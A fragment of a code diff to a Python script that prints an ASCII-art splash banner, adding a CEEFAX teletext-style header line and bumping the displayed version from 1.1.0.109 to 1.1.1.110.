+    print(" P100      CEEFAX 1    100             Web 29 Dec 22:03/12 ")
     print(" █████████████████          ████████████                   ")
     print(" ████████  █████ █            █        █                   ")
     print(" ████████  █████ █ ██████████ █  ███████ █████████████████ ")
@@ -2964,7 +3041,7 @@ if __name__ == "__main__":
     print(" █████████████████ █  █████ █ ██████████ █  ████  ████████ ")
     print("                   █  █████ █            █  ████  ████████ ")
     print("                 ████████████          ███████████████████ ")
-    print("                      Ver: 1.1.0.109                       ")
+    print("                      Ver: 1.1.1.110                       ")
     print("       ░░░░░░░░ ░░░░░░░░ ░░░░░░░░ ░░░░░░░░ ░░░░░░░░        ")
     print("       ░    ░░░ ░     ░░ ░      ░ ░ ░░░░ ░ ░      ░        ")
     print("       ░ ░░░ ░░ ░ ░░░░ ░ ░ ░░░░ ░ ░  ░░░ ░ ░ ░░░░░░        ")
